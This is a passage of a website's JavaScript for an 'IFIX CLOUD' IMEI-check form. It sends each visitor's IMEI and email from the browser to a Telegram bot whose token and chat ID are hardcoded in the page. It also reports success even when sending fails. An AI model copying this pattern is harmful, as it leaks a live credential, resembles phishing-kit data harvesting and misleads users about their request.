                        imeiInput.value = '';
                        emailInput.value = '';
                        
                        // Reset button
                        checkImeiBtn.disabled = false;
                        checkImeiBtn.innerHTML = originalBtnText;
                    })
                    .catch(error => {
                        console.error('Error sending notification:', error);
                        
                        // Show success message anyway (fallback)
                        imeiForm.style.display = 'none';
                        imeiSuccess.style.display = 'block';
                        
                        // Reset form
                        imeiInput.value = '';
                        emailInput.value = '';
                        
                        // Reset button
                        checkImeiBtn.disabled = false;
                        checkImeiBtn.innerHTML = originalBtnText;
                    });
            });
        }
    }
    
    // Add styles for the new modal
    addImeiCheckStyles();
}

/**
 * Show error message for input field
 * @param {HTMLElement} input - Input field with error
 * @param {string} message - Error message
 */
function showInputError(input, message) {
    // Create error message element
    const errorDiv = document.createElement('div');
    errorDiv.className = 'error-message';
    errorDiv.textContent = message;
    errorDiv.style.color = '#ef4444';
    errorDiv.style.fontSize = '0.75rem';
    errorDiv.style.marginTop = '0.25rem';
    
    // Add error class to input
    input.style.borderColor = '#ef4444';
    
    // Insert error message after input
    input.parentNode.insertBefore(errorDiv, input.nextSibling);
    
    // Remove error on input focus
    input.addEventListener('focus', function() {
        input.style.borderColor = '';
        if (errorDiv.parentNode) {
            errorDiv.parentNode.removeChild(errorDiv);
        }
    }, { once: true });
}

/**
 * Send notification to Telegram bot
 * @param {string} imei - IMEI number
 * @param {string} email - Email address
 * @returns {Promise} - Promise that resolves when notification is sent
 */
function sendTelegramNotification(imei, email) {
    // Get current timestamp
    const now = new Date();
    const timestamp = now.toLocaleString();
    
    // Telegram bot token and chat ID
    const botToken = '8317723769:AAEMi7usRfjljzxs4v7DMCdz0s098UXnkI4';
    const chatId = '7413443284';
    
    // Message text
    const message = `
🔔 New IMEI Check Request!
📱 IMEI: ${imei}
📧 Email: ${email}
⏰ Time: ${timestamp}
🌐 Website: IFIX CLOUD
`;
    
    // Telegram API URL
    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
    
    // Send notification to Telegram
    return fetch(telegramUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify({
            chat_id: chatId,
            text: message,
            parse_mode: 'HTML'
        })
    })
    .then(response => {
        if (!response.ok) {
            throw new Error('Failed to send Telegram notification');
        }
        return response.json();
    });
}

/**
 * Add styles for the IMEI check modal
 */
function addImeiCheckStyles() {
    // Check if styles already exist
    if (document.getElementById('imei-check-styles')) return;
    
    const styleSheet = document.createElement('style');
    styleSheet.id = 'imei-check-styles';
    styleSheet.innerHTML = `
        .imei-check-container {
            padding: 1rem 0;
        }
        
        .imei-form {
            max-width: 600px;
            margin: 0 auto;
        }
        
        .imei-form h3 {
            margin-bottom: 0.5rem;
            text-align: center;
            color: var(--primary-color);
        }
        
        .imei-form p {
            margin-bottom: 1.5rem;
            text-align: center;
            color: var(--text-light);
        }
        
        .form-group {
            margin-bottom: 1.5rem;
        }
        
        .form-group label {
            display: block;
            margin-bottom: 0.5rem;
            font-weight: 500;
            color: var(--primary-color);
        }
        
        .form-group input {
            width: 100%;
            padding: 0.75rem 1rem;
            border: 1px solid var(--border-color);
            border-radius: 0.375rem;
            font-size: 1rem;
            transition: border-color 0.3s;
        }
        
        .form-group input:focus {
            outline: none;
            border-color: var(--accent-color);
            box-shadow: 0 0 0 2px rgba(59, 130, 246, 0.3);
        }
        
        .form-group small {
            display: block;
            margin-top: 0.5rem;
            font-size: 0.75rem;
            color: var(--text-light);
        }
        
        .imei-actions {
            display: flex;
            gap: 1rem;
            margin-top: 2rem;
        }
        
        .imei-actions button,
        .imei-actions a {
            flex: 1;
        }
        
        .imei-success {
            text-align: center;
            max-width: 500px;
            margin: 0 auto;
            padding: 2rem 1rem;
        }
        
        .success-icon {
            font-size: 4rem;
            color: #10b981;
            margin-bottom: 1.5rem;
        }
        
        .imei-success h3 {
            margin-bottom: 1rem;
            color: var(--primary-color);
        }
        
        .imei-success p {
            margin-bottom: 2rem;
            color: var(--text-light);
        }
        
        @media (max-width: 768px) {
            .imei-actions {
                flex-direction: column;
            }
        }
    `;
    
    document.head.appendChild(styleSheet);
} 